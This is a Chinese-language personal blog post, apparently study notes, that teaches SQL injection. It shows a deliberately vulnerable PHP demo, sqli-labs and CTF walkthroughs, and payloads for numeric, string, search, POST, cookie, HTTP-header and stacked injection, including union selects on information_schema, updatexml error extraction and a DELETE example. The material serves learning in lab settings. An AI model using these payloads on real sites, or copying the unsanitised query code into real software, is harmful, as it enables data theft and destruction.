<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://ggken753.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://GGken753.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-sql注入补充12" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/01/23/sql%E6%B3%A8%E5%85%A5%E8%A1%A5%E5%85%8512/" class="article-date">
  <time datetime="2021-01-23T07:30:04.392Z" itemprop="datePublished">2021-01-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/01/23/sql%E6%B3%A8%E5%85%A5%E8%A1%A5%E5%85%8512/">sql注入补充</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="1-什么是sql注入"><a href="#1-什么是sql注入" class="headerlink" title="1. 什么是sql注入"></a>1. 什么是sql注入</h2><p>通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
<h2 id="2-判断是否存在注入点"><a href="#2-判断是否存在注入点" class="headerlink" title="2.判断是否存在注入点"></a>2.判断是否存在注入点</h2><p>判断是否存在注入点最常见的做法是利用单引号，即“ ‘ ”。因为当你在网页上进行查询操作的时候，在后台提交的语句实际上是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM database_name WHERE id&#x3D;&#39;$id&#39;</span><br></pre></td></tr></table></figure>

<p>所以当你查询的时候键入单引号的时候，因为单引号不匹配，则会报错。然后可以测试是否存在SQL注入点。</p>
<p>1.1 and语句</p>
<p>在参数处输入 1 and 1=1、1 and 1=2。当出现前者返回页数为1的页面，而后者没有返回数据的时候，可以认为是存在注入点。当然也可以使用or语句进行测试。</p>
<p>1.2 or语句</p>
<p>在参数处输入 6 or 1 = 1，当前者6为不存在的数字时，即假 or 真，返回页面时，存在注入点。</p>
<p>1.3 加法</p>
<p>可以在参数处输入 1 + 1，若返回的是第2个页面，则存在注入点，同时需要注意的是“+”号需要进行url的转码，转码为%2b</p>
<p>1.4 减法</p>
<p>和加法类似，在参数处输入 4-2，若返回的是第二个页面，则存在注入点。</p>
<h2 id="3-判断数据库权限"><a href="#3-判断数据库权限" class="headerlink" title="3.判断数据库权限"></a>3.判断数据库权限</h2><p>判断数据库的权限是非常有必要的，毕竟SQL注入的目的就是要获取大量的数据，很多的时候会出现权限不足的情况。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ord(mid(user(),1,1))&#x3D;114</span><br></pre></td></tr></table></figure>

<p>在上述语句中，mid函数的作用是选取user()函数中的1第一个字符，ord()函数的作用是把字符转化为数字，整个字段的意思是判断user()中的第一个字符是否为ASCII码114，即r。如果返回正确，则可能拥有root权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from mysql.user)&gt;0</span><br></pre></td></tr></table></figure>

<p>而上述语句，利用select语句，如果返回正确，则可能有读写权限。</p>
<h2 id="4-sql注入类型"><a href="#4-sql注入类型" class="headerlink" title="4. sql注入类型"></a>4. sql注入类型</h2><blockquote>
<h5 id="按照注入点类型来分类"><a href="#按照注入点类型来分类" class="headerlink" title="按照注入点类型来分类"></a>按照注入点类型来分类</h5></blockquote>
<h3 id="（1）数字型注入点"><a href="#（1）数字型注入点" class="headerlink" title="（1）数字型注入点"></a>（1）数字型注入点</h3><p>许多网页链接有类似的结构 <a target="_blank" rel="noopener" href="http://xxx.com/users.php?id=1">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p>
<h3 id="（2）字符型注入点"><a href="#（2）字符型注入点" class="headerlink" title="（2）字符型注入点"></a>（2）字符型注入点</h3><p>网页链接有类似的结构 <a target="_blank" rel="noopener" href="http://xxx.com/users.php?name=admin">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name=&#39;admin&#39;</code> 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where name=&#39;admin&#39; and 1=1 &#39;</code> 我们需要将这些烦人的引号给处理掉。</p>
<h3 id="（3）搜索型注入点"><a href="#（3）搜索型注入点" class="headerlink" title="（3）搜索型注入点"></a>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>&quot;keyword=关键字&quot;</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like &#39;%测试%&#39; and &#39;%1%&#39;=&#39;%1%&#39;</code></p>
<blockquote>
<h5 id="按照数据提交的方式来分类"><a href="#按照数据提交的方式来分类" class="headerlink" title="按照数据提交的方式来分类"></a>按照数据提交的方式来分类</h5></blockquote>
<h3 id="（1）GET-注入"><a href="#（1）GET-注入" class="headerlink" title="（1）GET 注入"></a>（1）GET 注入</h3><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a target="_blank" rel="noopener" href="http://xxx.com/news.php?id=1">http://xxx.com/news.php?id=1</a> , id 是注入点。</p>
<p>将代码放进www</p>
<p>在浏览器中输入<a target="_blank" rel="noopener" href="http://127.0.0.1/demo.php">http://127.0.0.1/demo.php</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;sql数字型注入&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;数字型注入</span><br><span class="line"></span><br><span class="line">$id&#x3D;@$_GET[&#39;id&#39;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不报错</span><br><span class="line"></span><br><span class="line">if(isset($id)&amp;&amp;!empty($id))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    $con&#x3D;mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">    &#x2F;&#x2F;连接数据库</span><br><span class="line"></span><br><span class="line">    mysql_select_db(&quot;mysql&quot;,$con);</span><br><span class="line">    &#x2F;&#x2F;选择数据库</span><br><span class="line"></span><br><span class="line">    $sql&#x3D;&quot;select * from test where id&#x3D;$id&quot;;</span><br><span class="line">    &#x2F;&#x2F;sql语句</span><br><span class="line"></span><br><span class="line">    $result&#x3D;mysql_query($sql);</span><br><span class="line">    while($row&#x3D;mysql_fetch_array($result))</span><br><span class="line">    &#123;</span><br><span class="line">         echo &quot;ID:&quot;.$row[&#39;id&#39;].&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">         echo &quot;用户名:&quot;.$row[&#39;name&#39;].&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">          &#x2F;&#x2F;循环输出</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close($con);</span><br><span class="line">    &#x2F;&#x2F;关闭数据库</span><br><span class="line">    echo &quot;&lt;hr&#x2F;&gt;&quot;;</span><br><span class="line">    echo &quot;当前执行的sql语句:&quot;.$sql;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;没有获取到ID&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>从源代码中可以看到，sql语句直接接收了id参数值，存在明显的sql注入</p>
<p>输入id=1,查询到结果，返回正常</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210124131835408.png"></p>
<p>加单引号，报错，存在注入点</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210124132202109.png"></p>
<p>使用order by 查询该表的字段数，order by 2返回正常，3返回不正常，证明存在两个字段</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210124132359546.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210124132430966.png"></p>
<p>使用database()函数爆出数据库名</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210124132831416.png"></p>
<p>使用该语句查询数据表，语句如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select table_name,2 from information_schema.tables where table_schema &#x3D; database()</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210124133001255.png"></p>
<p><strong><em>注意字段数为2\</em></strong></p>
<p>查询test表，语句如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select column_name,2 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;74657374</span><br></pre></td></tr></table></figure>

<p><strong><em>注意74657374为test的十六进制编码\</em></strong></p>
<h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>修改php源代码的sql语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;select * from test where id&#x3D;&#39;$id&#39;&quot;;</span><br></pre></td></tr></table></figure>

<p>再次测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; union select 1,2  and  &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210124141725462.png"></p>
<p>同理以上的数字型注入</p>
<h4 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h4><p>修改源代码，下面不变</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;搜索注入</span><br><span class="line">	$name&#x3D;$_GET[&#39;key&#39;];</span><br><span class="line"></span><br><span class="line">    $con&#x3D;mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">    &#x2F;&#x2F;连接数据库</span><br><span class="line"></span><br><span class="line">    mysql_select_db(&quot;mysql&quot;,$con);</span><br><span class="line">    &#x2F;&#x2F;选择数据库</span><br><span class="line"></span><br><span class="line">    $sql&#x3D;&quot;select * from test where name like &#39;%$name%&#39;&quot;;</span><br><span class="line">    &#x2F;&#x2F;sql语句</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key&#x3D;l%&#39;  order  by  2  and  &#39;%&#x3D;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210124143629836.png"></p>
<h3 id="（2）POST-注入"><a href="#（2）POST-注入" class="headerlink" title="（2）POST 注入"></a>（2）POST 注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>
<p>在sql-lib中进行</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210124151127258.png"></p>
<p>1、打开bp抓包</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210124150741645.png"></p>
<p>2、发送至 repeater 中进行注入，在用户名处添加反斜扛测试内部SQL语句</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210124151009027.png"></p>
<p>3、分析：</p>
<p>根据报错，当输入用户名为 <code>222\</code> 时，错误提示在密码为 <code>555&#39;</code> 的错误，初步断定这是因为用户名处的 <code>\</code> 与其闭合单引号被转译为普通字符，因此无法进行闭合，导致密码的起始单引号被作为用户名的闭合符号，造成密码处的单引号无从闭合。</p>
<p>因此初步断定，SQL语句为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select uname, passwd from table where uname&#x3D;&#39;xxxx&#39; and passwd&#x3D;&#39;xxxx&#39;;</span><br></pre></td></tr></table></figure>

<p>因此当用户名为 <code>222\</code> 时，此时的查询 <strong>uname = ’ <code>222\&#39; and passwd=</code> ’</strong> ，将后边的查询语句作为用户名也输入了进去。</p>
<p>4、继续在用户名处添加注入信息</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210124152039711.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210124152055539.png"></p>
<p>成功登陆。</p>
<p>查看源代码：</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210124152237867.png"></p>
<h3 id="（3）Cookie-注入"><a href="#（3）Cookie-注入" class="headerlink" title="（3）Cookie 注入"></a>（3）Cookie 注入</h3><h4 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h4><p>Cookie的定义是这样的：Cookie是在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式。通常被用来辨别用户身份、进行session跟踪，最典型的应用就是保存用户的账号和密码用来自动登录网站和电子商务网站中的“购物车”。</p>
<p>Cookie注入简单来说就是利用Cookie而发起的注入攻击。从本质上来讲，Cookie注入与传统的SQL注入并无不同，两者都是针对数据库的注入，只是表现形式上略有不同罢了。</p>
<p>要想深入了解Cookie注入的成因，必须要了解ASP脚本中的request对象。它被用于从用户那里获取信息。Request对象的使用方法一般是这样的：request.[集合名称]（参数名称），比如获取从表单中提交的数据时可以这样写：request.form(“参数名称”)，但ASP中规定也可以省略集合名称，直接用这样的方式获取数据：request(“参数名称”)，当使用这样的方式获取数据时，ASP规定是按QueryString、Form、Cookies、ServerVariables的顺序来获取数据的。这样，当我们使用request(“参数名称”)方式获取客户端提交的数据，并且没有对使用request.cookies(“参数名称”)方式提交的数据进行过滤时，Cookie注入就产生了。</p>
<h4 id="二、Cookie注入典型步骤"><a href="#二、Cookie注入典型步骤" class="headerlink" title="二、Cookie注入典型步骤"></a>二、Cookie注入典型步骤</h4><p>1.寻找形如“.asp?id=xx”类的带参数的URL。</p>
<p>2.去掉“id=xx”查看页面显示是否正常，如果不正常，说明参数在数据传递中是直接起作用的。</p>
<p>3.清空浏览器地址栏，输入“javascript:alert(document.cookie=”id=”+escape(“xx”));”，按Enter键后弹出一个对话框，内容是“id=xx”，然后用原来的URL刷新页面，如果显示正常，说明应用使用Request(“id”)这种方式获取数据的。</p>
<p>4.重复上面的步骤，将常规SQL注入中的判断语句带入上面的URL：“javascript:alert(document.cookie=”id=”+escape(“xx and 1=1”));” “javascript:alert(document.cookie=”id=”+escape(“xx and 1=2”));”。和常规SQL注入一样，如果分别返回正常和不正常页面，则说明该应用存在注入漏洞，并可以进行cookie注入。</p>
<p>5.使用常规注入语句进行注入即可。</p>
<p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>
<h4 id="三、"><a href="#三、" class="headerlink" title="三、"></a>三、</h4><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>1、首先找到传参地址：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asp?id=xxx(例如：http://www.example.com/news.asp?id=1)</span><br></pre></td></tr></table></figure>

<p>2、去掉参数，访问该url</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/news.asp?</span><br></pre></td></tr></table></figure>

<p>如果页面访问不正常，则说明该参数id是访问页面所必需的的参数，可以尝试继续注入。</p>
<p>3、记录并清空当前浏览器地址栏中的地址，在其中输入</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;xxx&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//这里的xxx就是上一步中id=xxx中的参数值</span><br></pre></td></tr></table></figure>

<p>4、再浏览器地址栏中输入原来的url地址（注意，这里输入的是不带参数值的url,如下）：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/news.asp?</span><br></pre></td></tr></table></figure>

<p>按下回车，访问该url，如果发现页面正常显示了，到此可以证明，我们正在接受的页面存在request方法获取参数，可能存在cookie注入的风险</p>
<p>【利用方法】：手工检测到可能存在cookie注入时，我们就可以通过常规注入方法来进行注入了</p>
<p>1、清空地址栏，输入我们的写cookie代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;xxx and 1=1&quot;));</span><br></pre></td></tr></table></figure>

<p>2、使用无参数的url地址访问</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/news.asp?</span><br></pre></td></tr></table></figure>

<p>如果页面正常，我们就可以进行下一步检测。如果这是页面不正常，说明站点管理员已经部署了响应的防御策略，就需要找其他方法注入</p>
<p>3、清空地址，同样的方法写入新的cookie</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;xxx and 1=2&quot;));</span><br></pre></td></tr></table></figure>

<p>如果上一次页面正常，这次页面不正常，那么说明存在cookie注入漏洞，可以通过常规方法注入即可，只是cookie注入相对比较麻烦，需要每一次都在浏览器中执行写cookie代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;xxx 注入语句&quot;));</span><br></pre></td></tr></table></figure>

<p>然后访问不带参数的url地址</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/news.asp?</span><br></pre></td></tr></table></figure>

<p>根据页面提示进行注入即可</p>
<h3 id="（4）HTTP-头部注入"><a href="#（4）HTTP-头部注入" class="headerlink" title="（4）HTTP 头部注入"></a>（4）HTTP 头部注入</h3><h4 id="一、HTTP-user-agent-注入"><a href="#一、HTTP-user-agent-注入" class="headerlink" title="一、HTTP user-agent 注入"></a>一、HTTP user-agent 注入</h4><p>sqli-labs-master/less-18</p>
<p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
<h5 id="1-进入测试环境登录，并用bp拦截"><a href="#1-进入测试环境登录，并用bp拦截" class="headerlink" title="1.进入测试环境登录，并用bp拦截"></a>1.进入测试环境登录，并用bp拦截</h5><p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210125033632084.png"></p>
<h5 id="2-对http-user-agent进行错误注入测试"><a href="#2-对http-user-agent进行错误注入测试" class="headerlink" title="2.对http user-agent进行错误注入测试"></a>2.对http user-agent进行<code>错误注入</code>测试</h5><p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210125033733698.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210125033816334.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210125033918922.png"></p>
<p>可见是可以进行错误注入的，爆出一些信息。</p>
<h5 id="3-爆信息"><a href="#3-爆信息" class="headerlink" title="3.爆信息"></a>3.爆信息</h5><p>利用updatexml（）函数爆信息</p>
<p>代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and updatexml(null,concat(user(),0x3a,version()),null) or &#39;1&#39; &#x3D; &#39; 1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210125034314361.png"></p>
<p>这样就爆出了相应信息。</p>
<p><code>&#39; and</code> 用来拼接我们的 SQL 语句。<br><code>updatexml</code> 的第一个和第三个null是占位符。第二个位置可用来爆信息。<br><code>or &#39;1&#39;=&#39;1</code>（注意这里要少一个单引号，因为语句最后还有一个自动闭合的单引号）闭合最后的单引号否则整条语句报错违接查询不会被执行。</p>
<h4 id="二、HTTP-referer-注入"><a href="#二、HTTP-referer-注入" class="headerlink" title="二、HTTP referer 注入"></a>二、HTTP referer 注入</h4><p>sqli-labs-master/less-19</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210125035007871.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210125034714714.png"></p>
<h3 id="（5）堆查询注入"><a href="#（5）堆查询注入" class="headerlink" title="（5）堆查询注入"></a>（5）堆查询注入</h3><p>一.原理</p>
<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where product id=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<p>复现地址：<a target="_blank" rel="noopener" href="http://56c9b357-4ac3-4fa2-8283-3fce10ae7431.node3.buuoj.cn/">http://56c9b357-4ac3-4fa2-8283-3fce10ae7431.node3.buuoj.cn</a></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210126210903534.png"></p>
<p>测试：<br>1.当输入from、union等关键词时，回显Nonono.</p>
<p>2.输入数字时，显示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; 1 ) </span><br></pre></td></tr></table></figure>

<p>3.输入字符时，什么都没有显示</p>
<p>看了大佬的wp,可以使用堆叠注入</p>
<p>我们构建payload:</p>
<p>查看数据库：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show databases;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210126213819709.png"></p>
<p>也可以尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show tables;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210126214317850.png"></p>
<p>但是1;show columns  不行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show columns </span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20210126214740642.png"></p>
<p>不能解决这个问题</p>
<p>别人的wp：</p>
<p>这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符，通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from  Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用</p>
<p>解法1</p>
<p><strong>他的后端既然能做到数字回显字母不回显，说明有一个 或 结构，而且不直接回显flag，但作为一道题目，from一定是from flag。</strong><br> 所以猜测后端：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_POST[<span class="string">&#x27;query&#x27;</span>] || flag <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure>

<p>上面只是个猜测啊。。。<br> 可能不是flag是Flag,也可能from 别的地方。</p>
<p>但假设是这样的结构我们做一下。||是肯定有的。<br> 那我们该怎么做？其实payload很简单：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*，<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>直接回显flag。<br> 做出来过后我去看了别的wp，貌似师傅们最简单的做法就是这个，但没有解释为什么输入上述语句能得到flag回显，或者怎么就等同于：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,<span class="number">1</span> <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure>

<p>我们先讲第二个问题，<strong>为啥我这样写payload就等同下面的语句？</strong><br> 你想想这个结构。。。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> || flag</span><br></pre></td></tr></table></figure>

<p>这。。。短路语法啊。。<br> 返回的就是1嘛。。。。<br> 所以我们成功实现拼接：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,<span class="number">1</span> <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure>

